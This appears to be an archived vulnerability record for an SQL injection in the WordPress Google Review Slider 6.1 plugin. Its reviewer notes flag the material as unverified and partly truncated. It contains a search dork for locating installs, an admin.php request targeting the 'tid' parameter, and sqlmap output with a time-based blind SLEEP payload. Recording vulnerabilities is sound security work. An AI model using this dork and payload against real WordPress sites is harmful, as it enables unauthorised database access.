---
source: "hatch 补库批 20260928"
product: "WordPress Google Review Slider"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "WordPress Plugin - Google Review Slider 6.1 SQL Injection"
prerequisites: "来源所述条件，未列明部分仍待核：6.1 title; authenticated admin.php role and valid _wpnonce required/unspecified"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7fcb91a7b4ac63f4694703ac"
entity_id: "ve-7fcb91a7b4ac63f4694703ac"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：6.1 title; authenticated admin.php role and valid _wpnonce required/unspecified

- **代码与转录边界（1）**：GET与路径无空格、换行拆query，末尾taction=edi截断。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **凭据与会话边界（2）**：简介/影响栏空白，没有Cookie/nonce获取、原始出处或修复。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **事实待核（3）**：sqlmap片段提供tid时间盲注线索但无完整响应；不能推成匿名漏洞。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WordPress Plugin - Google Review Slider 6.1 SQL Injection

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

inurl:\"/wp-content/plugins/wp-google-places-review-slider/\"

POC :

     GET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=***
     &taction=edit HTTP/1.1

sqlmap result

    sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
    ---
    Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM
    (SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edi
